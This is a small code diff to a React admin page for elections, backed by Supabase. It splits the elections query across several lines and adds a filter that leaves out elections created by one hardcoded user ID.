@@ -23,7 +23,11 @@ const AdminElections = () => {
   const [adminEmail, setAdminEmail] = useState("");
 
   const load = async () => {
-    const { data } = await supabase.from("elections").select("*").order("created_at", { ascending: false });
+    const { data } = await supabase
+      .from("elections")
+      .select("*")
+      .neq("created_by", "7ebcdf88-10aa-4929-9fa6-00cc95c9213d")
+      .order("created_at", { ascending: false });
     setElections(data ?? []);
     const { data: r } = await supabase.from("user_roles").select("user_id").eq("role", "admin");
     if (r) {
